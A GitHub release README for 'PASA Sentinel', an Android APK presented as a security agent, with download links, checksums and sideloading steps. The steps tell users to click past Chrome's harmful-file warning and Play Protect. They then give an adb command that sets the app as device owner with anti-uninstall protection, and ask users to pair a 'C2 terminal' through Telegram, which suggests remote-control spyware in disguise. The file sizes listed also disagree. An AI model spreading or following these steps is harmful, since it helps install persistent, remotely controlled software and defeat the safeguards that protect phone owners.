# 📦 PASA Sentinel APK Releases

This directory hosts verified production release binaries of **PASA Sentinel (Private Android Security Agent)**.

---

## 📥 Direct Downloads

| File | Release | Build | Size | Direct Link |
|---|---|---|---|---|
| **`pasa-v3.7.16-81.apk`** | `v3.7.16` (Latest Production) | Build 81 | 18.42 MB | [Download APK](https://github.com/rbr48/pasa/raw/main/releases/pasa-v3.7.16-81.apk) |
| **`pasa-latest.apk`** | Rolling Latest | Build 81 | 18.42 MB | [Download Latest](https://github.com/rbr48/pasa/raw/main/releases/pasa-latest.apk) |
| **`PASA-Device-Owner-Setup-Kit.zip`** | Guided Setup Wizard | Windows ADB | 12.3 KB | [Download Kit](https://github.com/rbr48/pasa/raw/main/releases/PASA-Device-Owner-Setup-Kit.zip) |

* **High-Speed Global CDN Mirror:** [https://pasa.izhaanintellect.fun/releases/pasa-latest.apk](https://pasa.izhaanintellect.fun/releases/pasa-latest.apk)
* **Historical Releases & OTA Manifest:** [https://pasa.izhaanintellect.fun/api/app/latest](https://pasa.izhaanintellect.fun/api/app/latest)
* **Public Audit & SARIF Portal:** [https://pasa.izhaanintellect.fun/audit/](https://pasa.izhaanintellect.fun/audit/)

---

## 🔐 Cryptographic Integrity (v3.7.16 Build 81)

Always verify the SHA-256 checksum before sideloading onto your phone:

* **File:** `pasa-v3.7.16-81.apk` / `pasa-latest.apk`
* **File Size:** `19,331,786 bytes` (18.44 MB)
* **SHA-256 Checksum:**
  ```text
  2fbc6982df8ecddf89edc58eda37496dc85b43ec2fe48f3bdccf3257fb4f8cd2
  ```
* **Setup Kit SHA-256:**
  ```text
  7d1f99b6bfaf9975e570414bd1907b30e036952d3601601ee4cebde668080766
  ```
* **VirusTotal Multi-AV Consensus:** [Inspect Clean Report](https://www.virustotal.com/gui/file/2fbc6982df8ecddf89edc58eda37496dc85b43ec2fe48f3bdccf3257fb4f8cd2)

### Verify Checksum:
- **Windows (PowerShell):**
  ```powershell
  Get-FileHash pasa-latest.apk -Algorithm SHA256
  ```
- **Linux / macOS:**
  ```bash
  sha256sum pasa-latest.apk
  ```

---

## 🚀 Quick Sideload & Installation

1. Transfer or download the APK to your Android device (Android 8.0 through Android 16).
2. If Chrome displays *"File might be harmful"*, tap **Download anyway** (standard for off-market sovereign packages).
3. If Google Play Protect shows an unknown app notice, tap **More details** → **Install anyway**.
4. To unlock Knox-grade Device Owner defense (anti-uninstall & lockscreen shade protection), connect via USB and execute:
   ```bash
   adb shell dpm set-device-owner com.izhaanintellect.pasa/.admin.PasaDeviceAdmin
   ```
5. Follow the [Complete Telegram Bot Setup Guide](../README.md#-complete-telegram-bot-setup-guide) in the main README to pair your C2 terminal!
